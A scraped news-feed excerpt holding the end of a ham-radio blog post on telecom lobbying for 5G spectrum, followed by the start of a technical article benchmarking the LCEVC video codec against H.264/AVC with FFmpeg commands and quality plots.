<p>It’s not a secret that 5G will require a lot of spectrum. LTE channel bandwidth maxes out at 20 MHz per-channel. 5G channel bandwidth can be as wide as 100 MHz. No, that’s not a typo.&nbsp;</p>



<p>Wireless carriers have been <a href="https://venturebeat.com/2020/03/12/fccs-largest-spectrum-auction-nets-4-47-billion-for-5g-mmwave-bands/">snapping up spectrum in recent years</a> to prepare for 5G rollouts, making billions for the U.S. government in the process. Whoever has the most spectrum will have the most robust 5G network — plain and simple.&nbsp;</p>



<p>The Verizon and AT&amp;Ts of the world would love nothing more than to get their hands on spectrum that’s currently used by the Federal government (or amateur radio). That’s what the MOBILE NOW Act was all about— getting the Federal Government to sell more of the RF spectrum to private telecoms.</p>



<p>Remember Sen. John Thune, the legislator who first introduced the bill? Take a guess who his biggest financial donors are?</p>



<div><figure><img loading="lazy" src="http://k0lwc.com/wp-content/uploads/2020/10/John_Thune_Donors.jpg" alt="" width="620" height="456" srcset="http://k0lwc.com/wp-content/uploads/2020/10/John_Thune_Donors.jpg 709w, http://k0lwc.com/wp-content/uploads/2020/10/John_Thune_Donors-300x221.jpg 300w" sizes="(max-width: 620px) 100vw, 620px"><figcaption><em>Sen. John Thune financial donors 2015-2020. (OpenSecrets)</em></figcaption></figure></div>



<p>All of the companies highlighted in green have a stake in the development of 5G. Of course, Sen. Thune will introduce legislation as they’ve lobbied him to do. Whoever has the most money has the loudest voice in Congress. </p>



<h2>The threat to ham radio</h2>



<p>Private telecom companies pushing to purchase spectrum is the <em>greatest threat</em> to ham radio. It’s not FT8, DMR/YSF/D-Star or any other digital mode that hams grumble about.  More than ever we need effective representation in Washington D.C. advocating for the value that amateur radio provides to the <s>country </s> world. </p>



<p>However, the <a href="http://www.arrl.org/">American Radio Relay League (ARRL)</a> is actually doing less than ever before, only focusing on the <a href="https://www.congress.gov/bill/116th-congress/house-bill/466">Ham Radio Parity Act</a> which protects ham radio operators from HOAs. The bill remains stuck in committee.  </p>



<h4>Amateur Radio Relay League Lobbying Efforts</h4>



<div><figure><img loading="lazy" width="646" height="400" src="http://k0lwc.com/wp-content/uploads/2020/10/ARRL_Lobbying.jpg" alt="" srcset="http://k0lwc.com/wp-content/uploads/2020/10/ARRL_Lobbying.jpg 646w, http://k0lwc.com/wp-content/uploads/2020/10/ARRL_Lobbying-300x186.jpg 300w" sizes="(max-width: 646px) 100vw, 646px"></figure></div>



<h2>How can we fight back?</h2>



<p>I don’t have any good answers or ideas. The only thing I know for sure is we need better organization and representation. Oh, and that money thing might help. </p>



<p>Leave your ideas on how we can fight to preserve our ham radio bands below and <strong>share this article</strong> to help spread awareness in the ham radio community!</p>
<br>
			</div><!-- .entry-content -->
</article></div>]]>
            </description>
            <link>http://k0lwc.com/fcc-will-take-away-another-ham-band-in-2021/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24861870</guid>
            <pubDate>Thu, 22 Oct 2020 18:54:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[LCEVC (mpeg5) gets 28% gain over H.264/AVC at 3x Encoding speed]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24859703">thread link</a>) | @ponderingfish
<br/>
October 22, 2020 | https://ottverse.com/lcevc-vs-avc-using-ffmpeg/ | <a href="https://web.archive.org/web/*/https://ottverse.com/lcevc-vs-avc-using-ffmpeg/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<figure>
<img src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-vs-avc-featured-image.png?resize=678%2C381&amp;ssl=1" alt="lcevc avc ffmeg" title="lcevc-vs-avc-featured-image" data-src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-vs-avc-featured-image.png?resize=678%2C381&amp;ssl=1" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
</figure>


<p><strong>In this article, we compare the quality (objective &amp; subjective) and speed of LCEVC with H.264/AVC as its base-codec vs. H.264/AVC using FFmpeg. Let’s take a look at the experiments and the results, shall we?</strong></p>



<p><strong>The LCEVC Codec (MPEG-5 Part 2) or “Low Complexity Enhancement Video Coding” is one of the three new codecs being introduced by MPEG (others being VVC and EVC). LCEVC aims at increasing compression efficiency for existing codecs at little to no increase in coding complexity by using a base bitstream and an enhancement bitstream.</strong></p>








<h2><span id="Quick_Introduction_to_LCEVC"></span><a href="https://github.com/ottverse/website/blob/master/content/post/lcevc-avc-ffmpeg-evaluation.md#what-is-the-lcevc-codec-mpeg-5-part-2" target="_blank" rel="noopener"></a>Quick Introduction to LCEVC <span></span></h2>



<p>As described in our <a href="https://ottverse.com/lcevc-mpeg5-part2-low-complexity-enhancement-video-coding-guide/">comprehensive guide to LCEVC</a>, the LCEVC codec (Low Complexity Enhancement Video Coding) is&nbsp;<strong>“a codec to improve other codecs”</strong>&nbsp;with a low complexity-overhead. The LCEVC codec’s output is a combination of a “base bitstream” produced by a video codec such as AVC, HEVC, VP9, AV1, etc. along with an enhancement layer that can be used to improve the quality of the video.</p>



<p>If the decoder/end-device supports LCEVC, the enhancement layers are decoded, else, the base codec alone is used to decode the bitstream and the video is rendered to the user. This fallback mechanism ensures backward-compatibility and encourages roll-out of the LCEVC codec without the fear of breaking the user’s experience.</p>



<p>Here is a diagrammatic representation of how LCEVC works. More details can be found in our <a href="https://ottverse.com/lcevc-mpeg5-part2-low-complexity-enhancement-video-coding-guide/">comprehensive guide to LCEVC</a> and at <a href="https://www.lcevc.com/" target="_blank" rel="noopener">lcevc.com</a>.</p>



<figure><img data-attachment-id="124" data-permalink="https://ottverse.com/lcevc-layers-video-coding/" data-orig-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-layers-video-coding.png?fit=800%2C354&amp;ssl=1" data-orig-size="800,354" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="lcevc-layers-video-coding" data-image-description="" data-medium-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-layers-video-coding.png?fit=300%2C133&amp;ssl=1" data-large-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-layers-video-coding.png?fit=800%2C354&amp;ssl=1" loading="lazy" width="800" height="354" src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-layers-video-coding.png?resize=800%2C354&amp;is-pending-load=1#038;ssl=1" alt="lcevc mpeg5 part2" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-layers-video-coding.png?w=800&amp;ssl=1 800w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-layers-video-coding.png?resize=300%2C133&amp;ssl=1 300w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-layers-video-coding.png?resize=768%2C340&amp;ssl=1 768w" data-lazy-sizes="(max-width: 800px) 100vw, 800px" data-lazy-src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-layers-video-coding.png?resize=800%2C354&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>How LCEVC Works</figcaption></figure>



<h2><span id="Background_to_this_article"></span>Background to this article<span></span></h2>



<p>After writing an article on the LCEVC standard, I wanted to test it and see the results for myself. I got in touch with V-Nova (<em><a href="https://uk.linkedin.com/in/fabiomurra" target="_blank" rel="noopener">Fabio Murra</a>, <a href="https://uk.linkedin.com/in/anthonyconcannon" target="_blank" rel="noopener">Anthony Concannon</a></em>) and asked them if I can get my hands on some test software to run experiments and see the performance of LCEVC for myself. They agreed, and within a week, I started encoding using V-Nova’s LCEVC encoder and analyzing the results for myself.</p>



<p>Before we proceed with the codec evaluation, I’d like to highlight a few points.</p>



<ul><li>Encoders are complex and come with several tuning parameters designed to help you compress video to your liking and requirements. And, consequently, every codec comparison has its own idiosyncracies.</li><li>I am sure that once the LCEVC standard is released and encoder implementations enter the market, you’ll see more codec comparisons like the one presented here with different sequences, tuning parameters, presets, etc. That is the nature of codec comparisons.</li><li>I used open-source video test sequences so that others can reproduce the results I got. You can download them from <a rel="noreferrer noopener" href="https://media.xiph.org/video/derf/" target="_blank">Xiph.org</a></li></ul>



<p>My goal here is to showcase the difference between the two codecs and give you an understanding of what gains are there to be had if you use LCEVC.</p>



<p>With that short introduction, let’s get down to business and see how LCEVC fares in comparison to H.264/AVC.</p>



<h2><span id="Experiment_Setup"></span>Experiment Setup<span></span></h2>



<h3><span id="Test_Video_Sequences"></span>Test Video Sequences<span></span></h3>



<p>I chose two popular test videos to test LCEVC. They are –</p>



<p><strong>1. Park Joy, 50 fps, 1080p</strong>&nbsp;</p>



<figure><img data-attachment-id="667" data-permalink="https://ottverse.com/lcevc-vs-avc-using-ffmpeg/parkjoy/" data-orig-file="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy.png?fit=768%2C432&amp;ssl=1" data-orig-size="768,432" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="parkjoy" data-image-description="" data-medium-file="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy.png?fit=300%2C169&amp;ssl=1" data-large-file="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy.png?fit=768%2C432&amp;ssl=1" loading="lazy" width="768" height="432" src="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy.png?resize=768%2C432&amp;is-pending-load=1#038;ssl=1" alt="parkjoy lcevc" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy.png?w=768&amp;ssl=1 768w, https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy.png?resize=300%2C169&amp;ssl=1 300w" data-lazy-sizes="(max-width: 768px) 100vw, 768px" data-lazy-src="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy.png?resize=768%2C432&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>



<p>ParkJoy is a favorite among video compression teams, and it is interesting because of how the camera follows the actors. The camera movement gives an illusion of the people running in place with the background moving around them. ParkJoy is also characterized by highly textured grass, water, and trees that appear suddenly and close to the camera. All these elements make it a problematic sequence to compress, making the ParkJoy sequence interesting. You can download the original y4m file&nbsp;<a rel="noreferrer noopener" target="_blank" href="https://media.xiph.org/video/derf/">here</a>.&nbsp;</p>



<p><strong>2. CrowdRun, 50 fps, 1080p</strong></p>



<figure><img data-attachment-id="721" data-permalink="https://ottverse.com/lcevc-vs-avc-using-ffmpeg/crowd-run/" data-orig-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowd-run.png?fit=1152%2C648&amp;ssl=1" data-orig-size="1152,648" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="crowd-run" data-image-description="" data-medium-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowd-run.png?fit=300%2C169&amp;ssl=1" data-large-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowd-run.png?fit=1024%2C576&amp;ssl=1" loading="lazy" width="1024" height="576" src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowd-run.png?resize=1024%2C576&amp;is-pending-load=1#038;ssl=1" alt="" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowd-run.png?resize=1024%2C576&amp;ssl=1 1024w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowd-run.png?resize=300%2C169&amp;ssl=1 300w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowd-run.png?resize=768%2C432&amp;ssl=1 768w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowd-run.png?w=1152&amp;ssl=1 1152w" data-lazy-sizes="(max-width: 1000px) 100vw, 1000px" data-lazy-src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowd-run.png?resize=1024%2C576&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>



<p>The CrowdRun sequence (<a rel="noreferrer noopener" target="_blank" href="https://media.xiph.org/video/derf/">download from xiph</a>) is also popular because it has so many different elements that are hard to compress. There are sections of grass with fine details, a whole lot of people running in one direction (with clearly visible facial expressions), a tree right in the middle of the scene, and a lot of texture in the background (trees, clouds, etc.). Everything that’s needed to trouble an encoder is here!</p>



<h3><span id="Software"></span>Software<span></span></h3>



<p>V-Nova provided me with an FFmpeg build (4.3.1) with LCEVC enabled. It hasn’t been released to the public yet, but if you are interested in getting your hands on an LCEVC encoder and decoder, please reach out to the V-Nova team, and they’ll help you out.</p>



<p>Note: you need both an LCEVC-enabled encoder and decoder to test LCEVC which is what V-Nova gave me (<code>ffmpeg</code> and <code>ffplay</code> with LCEVC enabled).</p>



<h3><span id="Process"></span>Process<span></span></h3>



<p>As with all codec analysis, I ran the chosen sequences through the <strong>LCEVC encoder with H.264/AVC (libx264) as its base-codec and then ran the same sequence through <strong>H.264/</strong>AVC (libx264) using a range of bitrates in CBR mode</strong>. </p>



<p>The inputs are 1080p @ 50 fps and the same is retained for the output (1080p50).</p>



<p>I disabled tuning (<code>vmaf</code>, <code>psnr</code>, etc.) and chose a 1 sec GOP size for the experiments.</p>



<p><strong>Evaluation: </strong></p>



<ol><li>I computed the PSNR and VMAF values at different bitrates and used them to evaluate the codecs objectively.</li><li>I did side-by-side visual comparisons to judge which codec did better. There are screenshots pasted below to show you what I saw. </li></ol>



<p>Ok, let’s look at the tests and results now. </p>



<h2><span id="ParkJoy_LCEVC_vs_AVC"></span>ParkJoy: LCEVC vs. AVC<span></span></h2>



<h3><span id="Expt_1_CBR_using_an_IPPP_Structure_(no_Bpictures)"></span>Expt 1. CBR using an IPPP Structure (no B-pictures)<span></span></h3>



<p>For the first set of experiments, I chose a simple “IPPP” GOP structure without any B-pictures. With this fixed GOP structure, I was able to take any scene-change detection, or dynamic-GOP-length (or mini-GOP) decision algorithms out of the picture, and keep the focus purely on the way the two codecs are designed.</p>



<p>Here is an example of encoding with LCEVC using FFmpeg. You need to specify a set of parameters called the <code>eil_params</code> that are then transmitted to the base codec which is H.264/AVC (libx264) in this case.</p>



<p>For example, in the command line below, I instruct the base codec to disable B pictures, to use CBR encoding, disable scenecut detection, and use the <code>veryslow</code> preset. The <code>threads 1</code> is to ensure repeatability between H.264/AVC encodes (LCEVC is deterministic). </p>



<p><strong>Note</strong>: For speed comparisons, <code>threads 1</code> is disabled. </p>



<pre><code>ffmpeg.exe -i park_joy_1080p50.y4m -c:v lcevc_h264 -base_encoder x264 -threads 1 -r 50 -g 50 -b:v 1200k -eil_params "rc_pcrf_base_rc_mode=cbr;bframes=0;preset=veryslow;rc_pcrf_ipp_mode=1;scenecut=0"  parkjoy_1080p50_1200k_lcevc_ipp.mp4</code></pre>



<p>The equivalent AVC command line is – </p>



<pre><code>ffmpeg.exe -i park_joy_1080p50.y4m -c:v libx264 -threads 1 -r 50 -g 50 -b:v 1200k -bufsize 1200k -maxrate 1200k -sc_threshold 0 -preset veryslow -bf 0  parkjoy_1080p50_1200k_avc_ipp.mp4</code></pre>



<p>After repeating the encodes over a range of bitrates, I plotted the PSNR and VMAF values and here are the plots. </p>



<figure><ul data-carousel-extra="{&quot;blog_id&quot;:1,&quot;permalink&quot;:&quot;https:\/\/ottverse.com\/lcevc-vs-avc-using-ffmpeg\/&quot;}"><li><figure><img data-attachment-id="849" data-permalink="https://ottverse.com/lcevc-vs-avc-using-ffmpeg/parkjoy_ipp_avc_psnr/" data-orig-file="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_ipp_avc_psnr.png?fit=800%2C600&amp;ssl=1" data-orig-size="800,600" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="parkjoy_ipp_avc_psnr" data-image-description="" data-medium-file="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_ipp_avc_psnr.png?fit=300%2C225&amp;ssl=1" data-large-file="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_ipp_avc_psnr.png?fit=800%2C600&amp;ssl=1" loading="lazy" width="800" height="600" src="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_ipp_avc_psnr.png?resize=800%2C600&amp;is-pending-load=1#038;ssl=1" alt="" data-id="849" data-full-url="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_ipp_avc_psnr.png?resize=800%2C600&amp;ssl=1" data-link="https://ottverse.com/?attachment_id=849" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_ipp_avc_psnr.png?w=800&amp;ssl=1 800w, https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_ipp_avc_psnr.png?resize=300%2C225&amp;ssl=1 300w, https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_ipp_avc_psnr.png?resize=768%2C576&amp;ssl=1 768w, https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_ipp_avc_psnr.png?resize=400%2C300&amp;ssl=1 400w, https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_ipp_avc_psnr.png?resize=200%2C150&amp;ssl=1 200w, https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_ipp_avc_psnr.png?resize=678%2C509&amp;ssl=1 678w, https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_ipp_avc_psnr.png?resize=326%2C245&amp;ssl=1 326w, https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_ipp_avc_psnr.png?resize=80%2C60&amp;ssl=1 80w" data-lazy-sizes="(max-width: 800px) 100vw, 800px" data-lazy-src="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_ipp_avc_psnr.png?resize=800%2C600&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></li><li><figure><img data-attachment-id="850" data-permalink="https://ottverse.com/lcevc-vs-avc-using-ffmpeg/parkjoy_ipp_avc_vmaf/" data-orig-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_ipp_avc_vmaf.png?fit=800%2C600&amp;ssl=1" data-orig-size="800,600" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="parkjoy_ipp_avc_vmaf" data-image-description="" data-medium-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_ipp_avc_vmaf.png?fit=300%2C225&amp;ssl=1" data-large-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_ipp_avc_vmaf.png?fit=800%2C600&amp;ssl=1" loading="lazy" width="800" height="600" src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_ipp_avc_vmaf.png?resize=800%2C600&amp;is-pending-load=1#038;ssl=1" alt="" data-id="850" data-full-url="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_ipp_avc_vmaf.png?resize=800%2C600&amp;ssl=1" data-link="https://ottverse.com/?attachment_id=850" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_ipp_avc_vmaf.png?w=800&amp;ssl=1 800w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_ipp_avc_vmaf.png?resize=300%2C225&amp;ssl=1 300w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_ipp_avc_vmaf.png?resize=768%2C576&amp;ssl=1 768w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_ipp_avc_vmaf.png?resize=400%2C300&amp;ssl=1 400w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_ipp_avc_vmaf.png?resize=200%2C150&amp;ssl=1 200w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_ipp_avc_vmaf.png?resize=678%2C509&amp;ssl=1 678w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_ipp_avc_vmaf.png?resize=326%2C245&amp;ssl=1 326w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_ipp_avc_vmaf.png?resize=80%2C60&amp;ssl=1 80w" data-lazy-sizes="(max-width: 800px) 100vw, 800px" data-lazy-src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_ipp_avc_vmaf.png?resize=800%2C600&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></li></ul></figure>



<p>The RD-Plot above shows a substantial gain for LCEVC vs. vanilla H.264/AVC. At very high bitrates, the PSNR values converge, but, at lower bitrates, the gap is substantial. </p>



<p>If we compute the BD-Rate using the PSNR-Bitrate data, <strong>we get a value of <code>-28.07%</code> and this is huge</strong>. It implies that our tests were able to demonstrate that <strong>LCEVC can give a 28% average bitrate savings over H.264/AVC for equivalent video quality (computed using PSNR).  </strong></p>



<p>Here are the VMAF results plotted against the bitrate values. Again, as you can see, there is an immediate benefit to using LCEVC over AVC alone. </p>



<h3><span id="Expt_2_CBR_using_Bpictures"></span>Expt 2. CBR using B-pictures<span></span></h3>



<p>This command line is similar to what was used for the IPP mode, except, we enable B-frames. So, the encoder is allowed to use B-pictures and decide for itself, how many B-pictures to use, and where to place them. </p>



<p>The LCEVC command line is shown below. </p>



<pre><code>ffmpeg.exe -i park_joy_1080p50.y4m -c:v lcevc_h264 -base_encoder x264 -threads 1 -r 50 -g 50 -b:v 1200k -eil_params "rc_pcrf_base_rc_mode=cbr;preset=veryslow;scenecut=0" parkjoy_1080p50_1200k_lcevc.mp4</code></pre>



<p>The H.264/AVC equivalent command used is –</p>



<pre><code>ffmpeg.exe -i park_joy_1080p50.y4m -c:v libx264 -threads 1 -r 50 -g 50 -b:v 1200k -bufsize 1200k -maxrate 1200k  -preset veryslow -sc_threshold 0  parkjoy_1080p50_1200k_avc.mp4</code></pre>



<p>Here are the PSNR and VMAF values plotted against the bitrates. </p>



<figure><ul data-carousel-extra="{&quot;blog_id&quot;:1,&quot;permalink&quot;:&quot;https:\/\/ottverse.com\/lcevc-vs-avc-using-ffmpeg\/&quot;}"><li><figure><img data-attachment-id="852" data-permalink="https://ottverse.com/lcevc-vs-avc-using-ffmpeg/parkjoy_b_avc_psnr/" data-orig-file="https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_b_avc_psnr.png?fit=800%2C600&amp;ssl=1" data-orig-size="800,600" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="parkjoy_b_avc_psnr" data-image-description="" data-medium-file="https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_b_avc_psnr.png?fit=300%2C225&amp;ssl=1" data-large-file="https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_b_avc_psnr.png?fit=800%2C600&amp;ssl=1" loading="lazy" width="800" height="600" src="https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_b_avc_psnr.png?resize=800%2C600&amp;is-pending-load=1#038;ssl=1" alt="" data-id="852" data-full-url="https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_b_avc_psnr.png?resize=800%2C600&amp;ssl=1" data-link="https://ottverse.com/?attachment_id=852" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_b_avc_psnr.png?w=800&amp;ssl=1 800w, https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_b_avc_psnr.png?resize=300%2C225&amp;ssl=1 300w, https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_b_avc_psnr.png?resize=768%2C576&amp;ssl=1 768w, https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_b_avc_psnr.png?resize=400%2C300&amp;ssl=1 400w, https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_b_avc_psnr.png?resize=200%2C150&amp;ssl=1 200w, https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_b_avc_psnr.png?resize=678%2C509&amp;ssl=1 678w, https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_b_avc_psnr.png?resize=326%2C245&amp;ssl=1 326w, https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_b_avc_psnr.png?resize=80%2C60&amp;ssl=1 80w" data-lazy-sizes="(max-width: 800px) 100vw, 800px" data-lazy-src="https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_b_avc_psnr.png?resize=800%2C600&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></li><li><figure><img data-attachment-id="853" data-permalink="https://ottverse.com/lcevc-vs-avc-using-ffmpeg/parkjoy_b_avc_vmaf/" data-orig-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_b_avc_vmaf.png?fit=800%2C600&amp;ssl=1" data-orig-size="800,600" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="parkjoy_b_avc_vmaf" data-image-description="" data-medium-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_b_avc_vmaf.png?fit=300%2C225&amp;ssl=1" data-large-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_b_avc_vmaf.png?fit=800%2C600&amp;ssl=1" loading="lazy" width="800" height="600" src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_b_avc_vmaf.png?resize=800%2C600&amp;is-pending-load=1#038;ssl=1" alt="" data-id="853" data-full-url="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_b_avc_vmaf.png?resize=800%2C600&amp;ssl=1" data-link="https://ottverse.com/?attachment_id=853" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_b_avc_vmaf.png?w=800&amp;ssl=1 800w, 